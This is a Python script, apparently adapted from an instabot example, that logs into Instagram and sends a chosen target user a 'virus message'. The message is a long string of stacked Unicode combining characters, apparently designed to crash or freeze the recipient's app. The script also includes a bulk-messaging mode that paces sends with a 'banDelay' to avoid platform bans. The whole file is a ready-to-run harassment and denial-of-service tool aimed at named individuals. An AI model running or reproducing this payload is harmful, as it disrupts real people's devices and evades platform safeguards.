"""
    instabot example
    Workflow:
    1) Ask Message type
    2) Load messages CSV (if needed)
    3) Send message to each users
"""

import csv
import os
import sys
import time

from tqdm import tqdm

sys.path.append(os.path.join(sys.path[0], "../"))
from instabot import Bot  # noqa: E402

instaUsers = input("[*] Enter target name: ")
directMessage = " ✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘ ✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘ ✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘ ✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢...ۦོ͢  *щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.00щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.00щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.00щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.00щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.0.0.щ•Я•Ф•1.1.1.10ч0щ•Я•Ф•1.1.1.1.0.0.01.01.01.01.0.0.0.0.0.0.0.0.0.0.00.0.0.щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.0.0.0.0.0.0.0щ•Я•Ф•1.1.1.1.0.0щ•Я•Ф•1.1.1.1.0.0.0.0.0.0.0.0.0.0.0щ•Я•Ф•1.1.1.1.0.0щ•Я• ✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘ ✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘ ✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘ ✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦ ✘͢͢ۦོ͢✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢...ۦོ͢"

messagesToSend = 100
banDelay = 86400 / messagesToSend

print("\n")
print("%d: %s" % (1, "[*] virus message"))

deliveryMethod = int(input())

bot = Bot()
bot.login()

if deliveryMethod == 0:
    with open("messages.csv", "rU") as f:
        reader = csv.reader(f)
        for row in reader:
            print("Messaging " + row[0])
            bot.send_message(row[1], row[0])
            print("Waiting " + str(banDelay) + " seconds...")
            time.sleep(banDelay)
elif deliveryMethod == 1:
    bot.send_message(directMessage, instaUsers)
    print("[*] Sending payload... =>",instaUsers)
    time.sleep(3)
    exit()
